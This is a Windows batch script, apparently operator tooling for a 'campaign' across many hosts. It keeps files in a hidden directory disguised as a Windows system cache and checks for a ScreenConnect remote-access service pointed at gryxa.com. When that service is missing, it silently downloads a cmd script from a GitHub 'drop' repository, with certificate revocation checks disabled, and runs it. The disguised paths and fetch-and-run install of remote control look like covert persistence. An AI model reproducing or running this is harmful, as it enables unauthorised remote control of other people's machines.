@echo off
rem CAMPAIGN_SCRIPT CLEAN_GRYXA_20260804 C1 - fleet one-shot (launched by M71 hook, per-host ack).
rem 1) kill stale gryxa watcher/heal tasks + scripts + flags + old-FP MSI caches (sevrz keepers untouched)
rem 2) if gryxa 36e506ff not RUNNING with gryxa.com ImagePath -> chain pinned clean install (3754be1)
rem    (uninstall leftovers -> ui.gryxa.com MSI -> verify -> one reboot, marker-guarded)
rem Healthy hosts: sweep only, no install, no reboot.
setlocal EnableExtensions EnableDelayedExpansion
set "WD=C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache"
set "STAGE=%SystemRoot%\Temp\.upd"
set "CURL=%SystemRoot%\System32\curl.exe"
set "FP=36e506ff016b2151"
set "SVC=ScreenConnect Client (%FP%)"
set "LOG=%WD%\campaign_clean_gryxa.log"
if not exist "%WD%" mkdir "%WD%" >nul 2>&1
if not exist "%STAGE%" mkdir "%STAGE%" >nul 2>&1
echo [%DATE% %TIME%] campaign_begin host=%COMPUTERNAME%>>"%LOG%"

rem --- 1) stale automation that kept wiping fresh installs ---
for %%T in (WucacheGryxaWatch WucacheGryxaBoot WucacheGryxaCleanInstall WucacheGryxaHealOnce) do schtasks /Delete /TN "%%T" /F >nul 2>&1

del /f /q "%WD%\gryxa_watch.cmd" "%WD%\own_gryxa.cmd" "%WD%\own_gryxa_force.cmd" "%WD%\gryxa_diag.cmd" "%WD%\gryxa_clean_install.cmd" "%WD%\gryxa.cfg" "%WD%\gryxa_heal.flag" "%WD%\gryxa_deep.flag" "%WD%\gryxa_reinstall.flag" "%WD%\tg_gryxa.flag" "%WD%\own_mon_gryxa.state" >nul 2>&1
del /f /q "%WD%\pkg_gryxa.msi" "%STAGE%\pkg_gryxa.msi" >nul 2>&1
del /f /q "%WD%\force_gryxa.new" "%WD%\force_gryxa.done" "%WD%\no_install.new" "%WD%\observe.new" "%WD%\gryxa_watch.log" "%WD%\gryxa_watch.hb" "%WD%\gryxa_watch.pid" "%WD%\gryxa_health.out" "%WD%\gryxa_install.result" "%WD%\own_gryxa.log" "%WD%\own_gryxa.log.pre_observe" "%WD%\own_gryxa_force.log" >nul 2>&1
del /f /q "%WD%\drop_trace.log" "%WD%\drop_last_reason.txt" "%WD%\drop_scm_hint.tmp" "%WD%\drop_evt_hint.tmp" "%WD%\drop_mon_hits.tmp" >nul 2>&1
rmdir /s /q "%WD%\drop_events" >nul 2>&1
echo [%DATE% %TIME%] sweep_done>>"%LOG%"

rem --- 2) healthy? then done (no install, no reboot) ---
sc query "%SVC%" 2>nul | findstr /I /C:"RUNNING" >nul
if errorlevel 1 goto :Install
reg query "HKLM\SYSTEM\CurrentControlSet\Services\%SVC%" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
if errorlevel 1 goto :Install
echo [%DATE% %TIME%] skip_install_healthy>>"%LOG%"
goto :Fin

:Install
rem --- 3) chain the reviewed clean install (immutable pinned commit) ---
"%CURL%" -L --ssl-no-revoke --connect-timeout 15 --max-time 60 -o "%STAGE%\gryxa_clean_install.cmd" "https://raw.githubusercontent.com/xnobuddy/github-drop/3754be1/gryxa_clean_install.cmd" >>"%LOG%" 2>&1
if not exist "%STAGE%\gryxa_clean_install.cmd" goto :FailDl
findstr /C:"GRYXA_CLEAN_INSTALL R1" "%STAGE%\gryxa_clean_install.cmd" >nul 2>&1
if errorlevel 1 goto :FailDl
echo [%DATE% %TIME%] clean_queue>>"%LOG%"
call "%STAGE%\gryxa_clean_install.cmd"
echo [%DATE% %TIME%] campaign_end>>"%LOG%"
goto :Fin

:FailDl
echo [%DATE% %TIME%] FAIL clean_download>>"%LOG%"

:Fin
endlocal & exit /b 0
